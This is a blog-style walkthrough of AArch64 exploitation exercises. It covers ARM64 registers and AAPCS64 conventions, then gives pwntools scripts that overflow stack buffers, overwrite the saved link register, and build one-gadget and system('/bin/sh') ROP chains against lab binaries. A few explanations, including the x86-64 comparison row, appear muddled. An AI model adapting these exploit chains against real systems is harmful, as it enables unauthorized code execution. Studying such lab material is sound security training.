---
title: "AArch64 Binary Exploitation: easy_linux_pwn"
date: 2020-01-01
description: "AArch64 exploitation walkthrough covering calling conventions, stack layout differences from x86-64, and ROP chain construction"
tags: ["AArch64", "ARM64", "pwn", "ROP", "binary-exploitation", "Linux"]
categories: ["Research"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## Introduction

While looking for AArch64 binary exploitation challenges, I found the [easy-linux-pwn](https://github.com/xairy/easy-linux-pwn.git) repository — a collection of small exploitation exercises organized by architecture.

![easy-linux-pwn repo overview](/images/blog/aarch64-easy-linux-pwn/Untitled.png)

This post works through the ARM64 challenges, covering the architecture fundamentals needed to understand the exploit differences from x86-64.

## AArch64 Architecture Primer

### Registers

AArch64 provides 31 general-purpose registers: `X0` through `X30` (64-bit) and their lower 32-bit aliases `W0` through `W30`.

### PSTATE

PSTATE provides processor state information and is specific to AArch64/AArch32 or shared between both. It does not map 1:1 to the ARMv7 CPSR.

### Special-Purpose Registers

AArch64 provides several special-purpose registers alongside the general-purpose ones:

![AArch64 special-purpose registers](/images/blog/aarch64-easy-linux-pwn/Untitled-1.png)

### ELR (Exception Link Register)

ELR stores the return address when returning from an exception. The processor copies the appropriate ELR value for the current Exception Level into PC. It exists for each Exception Level except EL0 (which has no return target), named `ELR_EL[n]`.

### SPSR (Saved Program Status Register)

SPSR saves the processor state at a specific point in time. When an exception occurs, the processor saves the current state from PSTATE into SPSR. On exception return, the processor restores SPSR back into PSTATE. Like ELR, SPSR exists for each Exception Level except EL0, named `SPSR_EL[n]`.

### XZR / WZR

ZR is a zero register: when used as a source, it reads as zero; when used as a destination, the result is discarded. `XZR` is the 64-bit form, `WZR` is 32-bit.

### SP / WSP

SP points to the current stack location. It exists at each Exception Level (`SP_EL[n]`), and at levels other than EL0, either `SP_EL[n]` or `SP_EL0` can be selected as the active stack pointer. `WSP` is the 32-bit stack pointer.

### System Registers

System configuration in AArch64 is controlled through system registers, accessed via the `MSR` and `MRS` instructions. AArch64 does not support co-processors, so there is no cp15-style interface as in ARMv7. The number suffix in a system register name indicates the lowest Exception Level allowed to access it.

Example — reading `TTBR0_EL1` into `x0`:

```c
MRS x0, TTBR0_EL1
```

Writing `x0` into `TTBR0_EL1`:

```c
MSR TTBR0_EL1, x0
```

## ABI: Register Usage Conventions

Each architecture defines calling conventions so that binaries can interoperate. For AArch64, the relevant standard is **AAPCS64** (Procedure Call Standard for the ARM 64-bit Architecture), which defines the interface between assembly and C and covers function calling conventions.

![AAPCS64 register roles](/images/blog/aarch64-easy-linux-pwn/Untitled-2.png)

| Registers | Role |
|-----------|------|
| X0–X7 | Parameters and return values; X0 holds the return value |
| X8 | Indirect result location register (address for returning large values) |
| X9–X15 | Caller-saved temporary registers (caller must save if needed across a call) |
| X16–X17 | Intra-procedure-call scratch registers (IP0, IP1) |
| X18 | Platform register |
| X19–X28 | Callee-saved registers (callee must preserve) |
| X29 | Frame Pointer (FP) |
| X30 | Procedure Link Register (LR) |

The key difference from x86-64: the **return address is stored in LR (X30)**, not pushed onto the stack as the `call` instruction does in x86-64. X30 is saved onto the stack in the function prologue only when the function makes further calls.

---

## Challenge Walkthroughs

### 00-hello-pwn

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("/bin/sh");
    return EXIT_SUCCESS;
}
```

Just run it. This is the goal state for every pwn challenge.

```
# id
uid=0(root) gid=0(root) groups=0(root)
# exit
```

### 01-local-overflow

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

struct frame {
    char buffer[128];
    unsigned long x;
};

int main(int argc, char** argv) {
    struct frame f;
    memset(&f, 0, sizeof(f));

    printf("> ");
    fflush(stdout);

    read(STDIN_FILENO, &f.buffer[0], 256);

    printf("x = %lx\n", f.x);
    if (f.x == (unsigned long)0xdeadbabebeefc0deUL) {
        printf("launching shell...\n");
        system("/bin/sh");
    }

    return EXIT_SUCCESS;
}
```

Write `0xdeadbabebeefc0de` into the struct member `x` by overflowing `buffer`. The struct lays out `buffer[128]` immediately before `x`, so 128 bytes of padding followed by the target value is sufficient.

```python
#!/usr/bin/python

from struct import pack, unpack
import sys
from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/01-local-overflow'

p = process(binary_path)

payload = ''
payload += "A"*128
payload += p64(0xdeadbabebeefc0de)

p.readuntil('> ')
p.write(payload)
p.interactive()
```

### 02-overwrite-ret

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void not_called() {
    printf("launching shell...\n");
    system("/bin/sh");
}

int vulnerable() {
    printf("> ");
    fflush(stdout);

    char buffer[128];
    read(STDIN_FILENO, &buffer[0], 256);
}

int main(int argc, char** argv) {
    vulnerable();
    return EXIT_SUCCESS;
}
```

The goal is to redirect execution to `not_called`. In x86-64, `call` pushes the return address onto the stack and `ret` pops it back into RIP. AArch64 is different.

Let's hand-trace the assembly to understand the stack layout.

**main function disassembly:**

```
0x0000000000400724 <+0>:   stp  x29, x30, [sp, #-32]!
0x0000000000400728 <+4>:   mov  x29, sp
0x000000000040072c <+8>:   str  w0, [x29, #28]
0x0000000000400730 <+12>:  str  x1, [x29, #16]
0x0000000000400734 <+16>:  bl   0x4006e0 <vulnerable>
0x0000000000400738 <+20>:  mov  w0, #0x0
0x000000000040073c <+24>:  ldp  x29, x30, [sp], #32
0x0000000000400740 <+28>:  ret
```

Step by step:
1. `stp x29, x30, [sp, #-32]!` — saves x29 (FP) and x30 (LR) to `[sp]` and `[sp+8]`, then `sp -= 32` (function prologue)
2. `mov x29, sp` — set frame pointer
3. `str w0, [x29, #28]` — save argc
4. `str x1, [x29, #16]` — save argv
5. `bl 0x4006e0` — branch-and-link to `vulnerable`; x30 (LR) is set to the return address (`0x400738`)
6. `mov w0, #0x0` — set return value
7. `ldp x29, x30, [sp], #32` — restore x29 and x30 from stack, then `sp += 32`
8. `ret` — jump to x30

**vulnerable function disassembly:**

```
0x00000000004006e0 <+0>:   stp  x29, x30, [sp, #-144]!
0x00000000004006e4 <+4>:   mov  x29, sp
0x00000000004006e8 <+8>:   adrp x0, 0x400000
0x00000000004006ec <+12>:  add  x0, x0, #0x818
0x00000000004006f0 <+16>:  bl   0x4005a0 <printf@plt>
0x00000000004006f4 <+20>:  adrp x0, 0x410000
0x00000000004006f8 <+24>:  ldr  x0, [x0, #4056]
0x00000000004006fc <+28>:  ldr  x0, [x0]
0x0000000000400700 <+32>:  bl   0x400580 <fflush@plt>
0x0000000000400704 <+36>:  add  x0, x29, #0x10
0x0000000000400708 <+40>:  mov  x2, #0x100
0x000000000040070c <+44>:  mov  x1, x0
0x0000000000400710 <+48>:  mov  w0, #0x0
0x0000000000400714 <+52>:  bl   0x400590 <read@plt>
0x0000000000400718 <+56>:  nop
0x000000000040071c <+60>:  ldp  x29, x30, [sp], #144
0x0000000000400720 <+64>:  ret
```

Key observations:
- `stp x29, x30, [sp, #-144]!` — saves x29 and x30 at the top of the 144-byte stack frame
- `add x0, x29, #0x10` — `buffer` starts at `x29 + 0x10`
- `read(0, buffer, 0x100)` — reads 256 bytes into a 128-byte buffer
- The epilogue `ldp x29, x30, [sp], #144` restores x29 and x30 from the stack, then `ret` jumps to x30

The key insight: the saved **x30 (LR) lives at `sp + 8`** in the vulnerable frame (immediately after the saved x29). The buffer starts at `x29 + 0x10`.

To calculate the offset from `buffer` to the saved x30:

```
saved_x30 is at: sp + 8
buffer    is at: x29 + 0x10 = sp + 0x10  (since x29 == sp after prologue)
```

So `saved_x30 - buffer = sp + 8 - (sp + 0x10)` — but we need the offset within the full stack, including main's frame below. Using concrete addresses from the debugger session:

```python
saved_x30_addr = 0x4000800340 + 8  # stp x29, x30, [sp, #-32]! in main
buffer_addr    = 0x40008002c0
```

The offset equals `saved_x30_addr - buffer_addr`.

```python
#!/usr/bin/python

from struct import pack, unpack
import sys
from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/02-overwrite-ret'
binary = ELF(binary_path)

not_called_addr = binary.symbols['not_called']
saved_x30_addr  = 0x4000800340 + 8
buffer_addr     = 0x40008002c0

p = process(binary_path)

payload = ''
payload += "A" * (saved_x30_addr - buffer_addr)
payload += p64(not_called_addr)
p.readuntil('> ')
p.write(payload)
p.interactive()
```

The x30 register acts like `push ebp` in x86 terms — it marks the boundary of the frame. Computing the distance between `buffer` and the saved x30 reveals the entire stack frame size minus the buffer offset.

### 03-one-gadget

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vulnerable() {
    printf("> ");
    fflush(stdout);

    char buffer[128];
    read(STDIN_FILENO, &buffer[0], 256);
}

int main(int argc, char** argv) {
    vulnerable();
    return EXIT_SUCCESS;
}
```

This challenge uses a one-shot gadget (one-gadget). The structure is the same buffer overflow — we just need to reach a gadget in libc that calls `execl("/bin/sh", ...)`.

Let's trace the stack layout visually. At the point right after `read` in `vulnerable`, the stack looks like this (printed from `$sp`):

![Stack layout after read in vulnerable](/images/blog/aarch64-easy-linux-pwn/Untitled-3.png)

- Green (bottom): main's saved x29 and x30 (pushed in main's prologue)
- Red: `buffer[128]`
- Yellow: vulnerable's saved x29 and x30

What we can overwrite: `buffer` and main's saved x30 (LR).

The epilogue sequence:

```
0x0000000000400670 <+60>:  ldp  x29, x30, [sp], #144
0x0000000000400674 <+64>:  ret
```

After `vulnerable` returns, main's own epilogue:

```
0x0000000000400738 <+20>:  mov  w0, #0x0
0x000000000040073c <+24>:  ldp  x29, x30, [sp], #32
0x0000000000400740 <+28>:  ret
```

This second epilogue loads x29 and x30 from the stack and then jumps to x30. We want x30 to point to our gadget.

The one-gadget calls `execl("/bin/sh", x1)`. For it to work, x1 must be NULL (or point to zero):

![one-gadget target](/images/blog/aarch64-easy-linux-pwn/Untitled-8.png)

We need a gadget that loads x1 from a controlled location and then gives us a second redirect. A suitable gadget:

```
0x2c490 : ldr x1, [x29, #0x18]; ldp x29, x30, [sp], #0x20; mov x0 x1; ret;
```

This gadget loads x1 from `[x29 + 0x18]` and loads a new x30 from the stack.

**Payload layout:**

```
| buffer[128] | zero_addr - 0x18 | ldr_x1_x30_ret | "B"x16 | p64(0) | execl_gadget |
|             |      x29         |      x30        | dummy  |   x29  |      x30     |
```

We fill the buffer, then:
1. Set x29 to `zero_addr - 0x18` so that `ldr x1, [x29, #0x18]` loads from `zero_addr` (giving x1 = 0)
2. Set x30 to the `ldr_x1_x30_ret` gadget
3. After that gadget, x30 becomes the one-gadget address

```python
#!/usr/bin/python

from struct import pack, unpack
import sys
from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/03-one-gadget'
libc_path   = '/usr/aarch64-linux-gnu/lib/libc-2.27.so'

binary = ELF(binary_path)
libc   = ELF(libc_path)
p      = process(binary_path)

libc_base                = 0x0000004000846000
saved_x30_addr           = 0x4000800340 + 8
buffer_addr              = 0x40008002c0
one_gadget_addr          = libc_base + 0x63e80      # execl("/bin/sh", x1=NULL)
ldr_x1_x30_ret_gadget    = libc_base + 0x2c490      # ldr x1, [x29, #0x18]; ldp x29, x30, [sp], #0x20; mov x0 x1; ret

bin_sh_addr = libc_base + libc.search('/bin/sh\x00').next()
zero_addr   = libc_base + libc.search(p64(0)).next()

payload  = ''
payload += "A" * (saved_x30_addr - buffer_addr - 8)
payload += p64(zero_addr - 0x18)       # x29: ldr x1, [x29, #0x18] loads from zero_addr
payload += p64(ldr_x1_x30_ret_gadget)  # x30: jump to ldr gadget
payload += "B" * 16                    # dummy
payload += p64(0)                      # x29 for next frame
payload += p64(one_gadget_addr)        # x30: one-gadget

p.readuntil('> ')
p.write(payload)
p.interactive()
```

### 06-system-rop

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vulnerable() {
    printf("> ");
    fflush(stdout);

    char buffer[128];
    read(STDIN_FILENO, &buffer[0], 512);
}

int main(int argc, char** argv) {
    vulnerable();
    return EXIT_SUCCESS;
}
```

Same overflow, but solved with a classic ROP chain to call `system("/bin/sh")`.

The goal: get `x0 = &"/bin/sh"` and call `system`. In x86-64 you typically chain `pop rdi; ret` gadgets. In AArch64 the equivalent approach uses gadgets that load multiple registers at once via `ldp`.

Two gadgets found in libc:

```
ldp_x24_x25_x30_ret: ldp x24, x25, [sp, #0x38]; ldp x29, x30, [sp], #0x50; ret
mov_x0_x24_blr_x25:  mov x0, x24; blr x25;
```

**Chain:**
1. Jump to `ldp_x24_x25_x30_ret` — this loads x24 and x25 from `[sp + 0x38]` and a new x30 from the stack
2. x30 is set to `mov_x0_x24_blr_x25` — when `ret` fires, it lands here
3. `mov_x0_x24_blr_x25` sets x0 to x24 (`&"/bin/sh"`) and calls x25 (`system`)

**Payload layout:**

```
| buffer + dummy | ldp_x24_x25_x30_ret | dummy[16] | p64(0) | mov_x0_x24_blr_x25 | dummy(0x38-16) | &/bin/sh | system |
```

```python
import struct
import sys

from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/06-system-rop'
libc_path   = '/usr/aarch64-linux-gnu/lib/libc-2.27.so'

saved_x30_addr = 0x4000800340 + 8
buffer_addr    = 0x40008002c0
libc_addr      = 0x0000004000846000

ldp_x24_x25_x30_ret_addr = libc_addr + 0x00036edc  # ldp x24, x25, [sp, #0x38]; ldp x29, x30, [sp], #0x50; ret
mov_x0_x24_blr_x25_addr  = libc_addr + 0x000ce2ec  # mov x0, x24; blr x25;

libc       = ELF(libc_path)
system_addr  = libc_addr + libc.symbols['system']
bin_sh_addr  = libc_addr + libc.search('/bin/sh\x00').next()

p = process(binary_path)

payload  = ''
payload += 'a' * (saved_x30_addr - buffer_addr)
payload += p64(ldp_x24_x25_x30_ret_addr)  # x30: land here first
payload += 'b' * 16                        # dummy
payload += p64(0)                          # x29
payload += p64(mov_x0_x24_blr_x25_addr)   # x30: next ret target
payload += 'c' * (0x38 - 16)              # pad to reach sp+0x38
payload += p64(bin_sh_addr)               # x24 -> "/bin/sh"
payload += p64(system_addr)               # x25 -> system

p.readuntil('> ')
p.write(payload)
p.interactive()
```

---

## Stack Layout: AArch64 vs x86-64

The core conceptual difference that trips up x86-64 exploitation practitioners working on AArch64 for the first time:

| Aspect | x86-64 | AArch64 |
|--------|--------|---------|
| Return address storage | `call` pushes RIP onto stack automatically | `bl` writes return address into X30 (LR) |
| Stack save | Only if a nested call is made | Prologue `stp x29, x30, [sp, #-N]!` saves both FP and LR |
| Ret instruction | `ret` pops RIP from stack | `ret` jumps to X30 |
| Overflow target | Overwrite return address directly on stack | Overwrite saved X30 at known stack offset |
| Gadget chaining | `pop rdi; ret` style | `ldp x0, x1, [sp], #N; ret` style — multiple regs per gadget |

The debugging approach shown in challenge 03 is essential for AArch64 exploitation: use `qemu-aarch64-static` with the `-g` flag to attach GDB and directly observe how the `ldp` epilogues move values through registers before the final `ret`.

```bash
qemu-aarch64-static -L /usr/aarch64-linux-gnu -g 1234 ./bin/arm64/03-one-gadget <<< $(perl -e 'print "A"x128, "B"x8, "C"x8')
```

This makes the stack frame transitions concrete and removes the guesswork from offset calculations.
